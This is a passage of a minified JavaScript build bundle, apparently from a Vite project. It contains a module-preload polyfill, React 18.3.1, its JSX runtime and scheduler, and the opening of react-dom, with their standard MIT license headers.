function Jd(e,n){for(var t=0;t<n.length;t++){const s=n[t];if(typeof s!="string"&&!Array.isArray(s)){for(const r in s)if(r!=="default"&&!(r in e)){const i=Object.getOwnPropertyDescriptor(s,r);i&&Object.defineProperty(e,r,i.get?i:{enumerable:!0,get:()=>s[r]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const i of r)if(i.type==="childList")for(const a of i.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&s(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const i={};return r.integrity&&(i.integrity=r.integrity),r.referrerPolicy&&(i.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?i.credentials="include":r.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function s(r){if(r.ep)return;r.ep=!0;const i=t(r);fetch(r.href,i)}})();function eh(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var nu={exports:{}},ci={},tu={exports:{}},H={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Fs=Symbol.for("react.element"),nh=Symbol.for("react.portal"),th=Symbol.for("react.fragment"),sh=Symbol.for("react.strict_mode"),rh=Symbol.for("react.profiler"),ih=Symbol.for("react.provider"),ah=Symbol.for("react.context"),lh=Symbol.for("react.forward_ref"),oh=Symbol.for("react.suspense"),ch=Symbol.for("react.memo"),uh=Symbol.for("react.lazy"),yo=Symbol.iterator;function ph(e){return e===null||typeof e!="object"?null:(e=yo&&e[yo]||e["@@iterator"],typeof e=="function"?e:null)}var su={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},ru=Object.assign,iu={};function Ut(e,n,t){this.props=e,this.context=n,this.refs=iu,this.updater=t||su}Ut.prototype.isReactComponent={};Ut.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};Ut.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function au(){}au.prototype=Ut.prototype;function ul(e,n,t){this.props=e,this.context=n,this.refs=iu,this.updater=t||su}var pl=ul.prototype=new au;pl.constructor=ul;ru(pl,Ut.prototype);pl.isPureReactComponent=!0;var vo=Array.isArray,lu=Object.prototype.hasOwnProperty,dl={current:null},ou={key:!0,ref:!0,__self:!0,__source:!0};function cu(e,n,t){var s,r={},i=null,a=null;if(n!=null)for(s in n.ref!==void 0&&(a=n.ref),n.key!==void 0&&(i=""+n.key),n)lu.call(n,s)&&!ou.hasOwnProperty(s)&&(r[s]=n[s]);var l=arguments.length-2;if(l===1)r.children=t;else if(1<l){for(var o=Array(l),c=0;c<l;c++)o[c]=arguments[c+2];r.children=o}if(e&&e.defaultProps)for(s in l=e.defaultProps,l)r[s]===void 0&&(r[s]=l[s]);return{$$typeof:Fs,type:e,key:i,ref:a,props:r,_owner:dl.current}}function dh(e,n){return{$$typeof:Fs,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function hl(e){return typeof e=="object"&&e!==null&&e.$$typeof===Fs}function hh(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var wo=/\/+/g;function Li(e,n){return typeof e=="object"&&e!==null&&e.key!=null?hh(""+e.key):n.toString(36)}function gr(e,n,t,s,r){var i=typeof e;(i==="undefined"||i==="boolean")&&(e=null);var a=!1;if(e===null)a=!0;else switch(i){case"string":case"number":a=!0;break;case"object":switch(e.$$typeof){case Fs:case nh:a=!0}}if(a)return a=e,r=r(a),e=s===""?"."+Li(a,0):s,vo(r)?(t="",e!=null&&(t=e.replace(wo,"$&/")+"/"),gr(r,n,t,"",function(c){return c})):r!=null&&(hl(r)&&(r=dh(r,t+(!r.key||a&&a.key===r.key?"":(""+r.key).replace(wo,"$&/")+"/")+e)),n.push(r)),1;if(a=0,s=s===""?".":s+":",vo(e))for(var l=0;l<e.length;l++){i=e[l];var o=s+Li(i,l);a+=gr(i,n,t,o,r)}else if(o=ph(e),typeof o=="function")for(e=o.call(e),l=0;!(i=e.next()).done;)i=i.value,o=s+Li(i,l++),a+=gr(i,n,t,o,r);else if(i==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return a}function Xs(e,n,t){if(e==null)return e;var s=[],r=0;return gr(e,s,"","",function(i){return n.call(t,i,r++)}),s}function fh(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var be={current:null},yr={transition:null},mh={ReactCurrentDispatcher:be,ReactCurrentBatchConfig:yr,ReactCurrentOwner:dl};function uu(){throw Error("act(...) is not supported in production builds of React.")}H.Children={map:Xs,forEach:function(e,n,t){Xs(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return Xs(e,function(){n++}),n},toArray:function(e){return Xs(e,function(n){return n})||[]},only:function(e){if(!hl(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};H.Component=Ut;H.Fragment=th;H.Profiler=rh;H.PureComponent=ul;H.StrictMode=sh;H.Suspense=oh;H.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=mh;H.act=uu;H.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=ru({},e.props),r=e.key,i=e.ref,a=e._owner;if(n!=null){if(n.ref!==void 0&&(i=n.ref,a=dl.current),n.key!==void 0&&(r=""+n.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(o in n)lu.call(n,o)&&!ou.hasOwnProperty(o)&&(s[o]=n[o]===void 0&&l!==void 0?l[o]:n[o])}var o=arguments.length-2;if(o===1)s.children=t;else if(1<o){l=Array(o);for(var c=0;c<o;c++)l[c]=arguments[c+2];s.children=l}return{$$typeof:Fs,type:e.type,key:r,ref:i,props:s,_owner:a}};H.createContext=function(e){return e={$$typeof:ah,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:ih,_context:e},e.Consumer=e};H.createElement=cu;H.createFactory=function(e){var n=cu.bind(null,e);return n.type=e,n};H.createRef=function(){return{current:null}};H.forwardRef=function(e){return{$$typeof:lh,render:e}};H.isValidElement=hl;H.lazy=function(e){return{$$typeof:uh,_payload:{_status:-1,_result:e},_init:fh}};H.memo=function(e,n){return{$$typeof:ch,type:e,compare:n===void 0?null:n}};H.startTransition=function(e){var n=yr.transition;yr.transition={};try{e()}finally{yr.transition=n}};H.unstable_act=uu;H.useCallback=function(e,n){return be.current.useCallback(e,n)};H.useContext=function(e){return be.current.useContext(e)};H.useDebugValue=function(){};H.useDeferredValue=function(e){return be.current.useDeferredValue(e)};H.useEffect=function(e,n){return be.current.useEffect(e,n)};H.useId=function(){return be.current.useId()};H.useImperativeHandle=function(e,n,t){return be.current.useImperativeHandle(e,n,t)};H.useInsertionEffect=function(e,n){return be.current.useInsertionEffect(e,n)};H.useLayoutEffect=function(e,n){return be.current.useLayoutEffect(e,n)};H.useMemo=function(e,n){return be.current.useMemo(e,n)};H.useReducer=function(e,n,t){return be.current.useReducer(e,n,t)};H.useRef=function(e){return be.current.useRef(e)};H.useState=function(e){return be.current.useState(e)};H.useSyncExternalStore=function(e,n,t){return be.current.useSyncExternalStore(e,n,t)};H.useTransition=function(){return be.current.useTransition()};H.version="18.3.1";tu.exports=H;var C=tu.exports;const pu=eh(C),gh=Jd({__proto__:null,default:pu},[C]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var yh=C,vh=Symbol.for("react.element"),wh=Symbol.for("react.fragment"),kh=Object.prototype.hasOwnProperty,bh=yh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,xh={key:!0,ref:!0,__self:!0,__source:!0};function du(e,n,t){var s,r={},i=null,a=null;t!==void 0&&(i=""+t),n.key!==void 0&&(i=""+n.key),n.ref!==void 0&&(a=n.ref);for(s in n)kh.call(n,s)&&!xh.hasOwnProperty(s)&&(r[s]=n[s]);if(e&&e.defaultProps)for(s in n=e.defaultProps,n)r[s]===void 0&&(r[s]=n[s]);return{$$typeof:vh,type:e,key:i,ref:a,props:r,_owner:bh.current}}ci.Fragment=wh;ci.jsx=du;ci.jsxs=du;nu.exports=ci;var y=nu.exports,hu={exports:{}},Me={},fu={exports:{}},mu={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(_,L){var R=_.length;_.push(L);e:for(;0<R;){var j=R-1>>>1,U=_[j];if(0<r(U,L))_[j]=L,_[R]=U,R=j;else break e}}function t(_){return _.length===0?null:_[0]}function s(_){if(_.length===0)return null;var L=_[0],R=_.pop();if(R!==L){_[0]=R;e:for(var j=0,U=_.length,ie=U>>>1;j<ie;){var $=2*(j+1)-1,ae=_[$],te=$+1,le=_[te];if(0>r(ae,R))te<U&&0>r(le,ae)?(_[j]=le,_[te]=R,j=te):(_[j]=ae,_[$]=R,j=$);else if(te<U&&0>r(le,R))_[j]=le,_[te]=R,j=te;else break e}}return L}function r(_,L){var R=_.sortIndex-L.sortIndex;return R!==0?R:_.id-L.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;e.unstable_now=function(){return i.now()}}else{var a=Date,l=a.now();e.unstable_now=function(){return a.now()-l}}var o=[],c=[],u=1,d=null,h=3,v=!1,k=!1,x=!1,A=typeof setTimeout=="function"?setTimeout:null,p=typeof clearTimeout=="function"?clearTimeout:null,f=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function m(_){for(var L=t(c);L!==null;){if(L.callback===null)s(c);else if(L.startTime<=_)s(c),L.sortIndex=L.expirationTime,n(o,L);else break;L=t(c)}}function S(_){if(x=!1,m(_),!k)if(t(o)!==null)k=!0,E(T);else{var L=t(c);L!==null&&D(S,L.startTime-_)}}function T(_,L){k=!1,x&&(x=!1,p(b),b=-1),v=!0;var R=h;try{for(m(L),d=t(o);d!==null&&(!(d.expirationTime>L)||_&&!F());){var j=d.callback;if(typeof j=="function"){d.callback=null,h=d.priorityLevel;var U=j(d.expirationTime<=L);L=e.unstable_now(),typeof U=="function"?d.callback=U:d===t(o)&&s(o),m(L)}else s(o);d=t(o)}if(d!==null)var ie=!0;else{var $=t(c);$!==null&&D(S,$.startTime-L),ie=!1}return ie}finally{d=null,h=R,v=!1}}var I=!1,g=null,b=-1,M=5,N=-1;function F(){return!(e.unstable_now()-N<M)}function B(){if(g!==null){var _=e.unstable_now();N=_;var L=!0;try{L=g(!0,_)}finally{L?W():(I=!1,g=null)}}else I=!1}var W;if(typeof f=="function")W=function(){f(B)};else if(typeof MessageChannel<"u"){var w=new MessageChannel,O=w.port2;w.port1.onmessage=B,W=function(){O.postMessage(null)}}else W=function(){A(B,0)};function E(_){g=_,I||(I=!0,W())}function D(_,L){b=A(function(){_(e.unstable_now())},L)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(_){_.callback=null},e.unstable_continueExecution=function(){k||v||(k=!0,E(T))},e.unstable_forceFrameRate=function(_){0>_||125<_?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):M=0<_?Math.floor(1e3/_):5},e.unstable_getCurrentPriorityLevel=function(){return h},e.unstable_getFirstCallbackNode=function(){return t(o)},e.unstable_next=function(_){switch(h){case 1:case 2:case 3:var L=3;break;default:L=h}var R=h;h=L;try{return _()}finally{h=R}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(_,L){switch(_){case 1:case 2:case 3:case 4:case 5:break;default:_=3}var R=h;h=_;try{return L()}finally{h=R}},e.unstable_scheduleCallback=function(_,L,R){var j=e.unstable_now();switch(typeof R=="object"&&R!==null?(R=R.delay,R=typeof R=="number"&&0<R?j+R:j):R=j,_){case 1:var U=-1;break;case 2:U=250;break;case 5:U=1073741823;break;case 4:U=1e4;break;default:U=5e3}return U=R+U,_={id:u++,callback:L,priorityLevel:_,startTime:R,expirationTime:U,sortIndex:-1},R>j?(_.sortIndex=R,n(c,_),t(o)===null&&_===t(c)&&(x?(p(b),b=-1):x=!0,D(S,R-j))):(_.sortIndex=U,n(o,_),k||v||(k=!0,E(T))),_},e.unstable_shouldYield=F,e.unstable_wrapCallback=function(_){var L=h;return function(){var R=h;h=L;try{return _.apply(this,arguments)}finally{h=R}}}})(mu);fu.exports=mu;var Sh=fu.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var _h=C,Re=Sh;function P(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var gu=new Set,ys={};function lt(e,n){Rt(e,n),Rt(e+"Capture",n)}function Rt(e,n){for(ys[e]=n,e=0;e<n.length;e++)gu.add(n[e])}var hn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),aa=Object.prototype.hasOwnProperty,Eh=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,ko={},bo={};function Th(e){return aa.call(bo,e)?!0:aa.call(ko,e)?!1:Eh.test(e)?bo[e]=!0:(ko[e]=!0,!1)}function Ch(e,n,t,s){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return s?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Ph(e,n,t,s){if(n===null||typeof n>"u"||Ch(e,n,t,s))return!0;if(s)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function xe(e,n,t,s,r,i,a){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=s,this.attributeNamespace=r,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=i,this.removeEmptyString=a}var fe={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){fe[e]=new xe(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];fe[n]=new xe(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){fe[e]=new xe(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){fe[e]=new xe(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){fe[e]=new xe(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){fe[e]=new xe(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){fe[e]=new xe(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){fe[e]=new xe(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){fe[e]=new xe(e,5,!1,e.toLowerCase(),null,!1,!1)});var fl=/[\-:]([a-z])/g;function ml(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(fl,ml);fe[n]=new xe(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(fl,ml);fe[n]=new xe(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(fl,ml);fe[n]=new xe(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){fe[e]=new xe(e,1,!1,e.toLowerCase(),null,!1,!1)});fe.xlinkHref=new xe("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){fe[e]=new xe(e,1,!1,e.toLowerCase(),null,!0,!0)});function gl(e,n,t,s){var r=fe.hasOwnProperty(n)?fe[n]:null;(r!==null?r.type!==0:s||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(Ph(n,t,r,s)&&(t=null),s||r===null?Th(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):r.mustUseProperty?e[r.propertyName]=t===null?r.type===3?!1:"":t:(n=r.attributeName,s=r.attributeNamespace,t===null?e.removeAttribute(n):(r=r.type,t=r===3||r===4&&t===!0?"":""+t,s?e.setAttributeNS(s,n,t):e.setAttribute(n,t))))}var vn=_h.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Ks=Symbol.for("react.element"),pt=Symbol.for("react.portal"),dt=Symbol.for("react.fragment"),yl=Symbol.for("react.strict_mode"),la=Symbol.for("react.profiler"),yu=Symbol.for("react.provider"),vu=Symbol.for("react.context"),vl=Symbol.for("react.forward_ref"),oa=Symbol.for("react.suspense"),ca=Symbol.for("react.suspense_list"),wl=Symbol.for("react.memo"),bn=Symbol.for("react.lazy"),wu=Symbol.for("react.offscreen"),xo=Symbol.iterator;function Gt(e){return e===null||typeof e!="object"?null:(e=xo&&e[xo]||e["@@iterator"],typeof e=="function"?e:null)}var J=Object.assign,Ni;function ts(e){if(Ni===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Ni=n&&n[1]||""}return`
`+Ni+e}var Ri=!1;function Oi(e,n){if(!e||Ri)return"";Ri=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(c){var s=c}Reflect.construct(e,[],n)}else{try{n.call()}catch(c){s=c}e.call(n.prototype)}else{try{throw Error()}catch(c){s=c}e()}}catch(c){if(c&&s&&typeof c.stack=="string"){for(var r=c.stack.split(`
`),i=s.stack.split(`
`),a=r.length-1,l=i.length-1;1<=a&&0<=l&&r[a]!==i[l];)l--;for(;1<=a&&0<=l;a--,l--)if(r[a]!==i[l]){if(a!==1||l!==1)do if(a--,l--,0>l||r[a]!==i[l]){var o=`
`+r[a].replace(" at new "," at ");return e.displayName&&o.includes("<anonymous>")&&(o=o.replace("<anonymous>",e.displayName)),o}while(1<=a&&0<=l);break}}}finally{Ri=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?ts(e):""}function Ah(e){switch(e.tag){case 5:return ts(e.type);case 16:return ts("Lazy");case 13:return ts("Suspense");case 19:return ts("SuspenseList");case 0:case 2:case 15:return e=Oi(e.type,!1),e;case 11:return e=Oi(e.type.render,!1),e;case 1:return e=Oi(e.type,!0),e;default:return""}}function ua(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case dt:return"Fragment";case pt:return"Portal";case la:return"Profiler";case yl:return"StrictMode";case oa:return"Suspense";case ca:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case vu:return(e.displayName||"Context")+".Consumer";case yu:return(e._context.displayName||"Context")+".Provider";case vl:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case wl:return n=e.displayName||null,n!==null?n:ua(e.type)||"Memo";case bn:n=e._payload,e=e._init;try{return ua(e(n))}catch{}}return null}function Lh(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return ua(n);case 8:return n===yl?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function Bn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function ku(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Nh(e){var n=ku(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),s=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var r=t.get,i=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return r.call(this)},set:function(a){s=""+a,i.call(this,a)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return s},setValue:function(a){s=""+a},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function Qs(e){e._valueTracker||(e._valueTracker=Nh(e))}function bu(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),s="";return e&&(s=ku(e)?e.checked?"true":"false":e.value),e=s,e!==t?(n.setValue(e),!0):!1}function Rr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function pa(e,n){var t=n.checked;return J({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function So(e,n){var t=n.defaultValue==null?"":n.defaultValue,s=n.checked!=null?n.checked:n.defaultChecked;t=Bn(n.value!=null?n.value:t),e._wrapperState={initialChecked:s,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function xu(e,n){n=n.checked,n!=null&&gl(e,"checked",n,!1)}function da(e,n){xu(e,n);var t=Bn(n.value),s=n.type;if(t!=null)s==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?ha(e,n.type,t):n.hasOwnProperty("defaultValue")&&ha(e,n.type,Bn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function _o(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var s=n.type;if(!(s!=="submit"&&s!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function ha(e,n,t){(n!=="number"||Rr(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var ss=Array.isArray;function _t(e,n,t,s){if(e=e.options,n){n={};for(var r=0;r<t.length;r++)n["$"+t[r]]=!0;for(t=0;t<e.length;t++)r=n.hasOwnProperty("$"+e[t].value),e[t].selected!==r&&(e[t].selected=r),r&&s&&(e[t].defaultSelected=!0)}else{for(t=""+Bn(t),n=null,r=0;r<e.length;r++){if(e[r].value===t){e[r].selected=!0,s&&(e[r].defaultSelected=!0);return}n!==null||e[r].disabled||(n=e[r])}n!==null&&(n.selected=!0)}}function fa(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(P(91));return J({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Eo(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(P(92));if(ss(t)){if(1<t.length)throw Error(P(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:Bn(t)}}function Su(e,n){var t=Bn(n.value),s=Bn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),s!=null&&(e.defaultValue=""+s)}function To(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function _u(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function ma(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?_u(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Zs,Eu=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,s,r){MSApp.execUnsafeLocalFunction(function(){return e(n,t,s,r)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(Zs=Zs||document.createElement("div"),Zs.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=Zs.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function vs(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var os={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Rh=["Webkit","ms","Moz","O"];Object.keys(os).forEach(function(e){Rh.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),os[n]=os[e]})});function Tu(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||os.hasOwnProperty(e)&&os[e]?(""+n).trim():n+"px"}function Cu(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var s=t.indexOf("--")===0,r=Tu(t,n[t],s);t==="float"&&(t="cssFloat"),s?e.setProperty(t,r):e[t]=r}}var Oh=J({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ga(e,n){if(n){if(Oh[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(P(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(P(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in 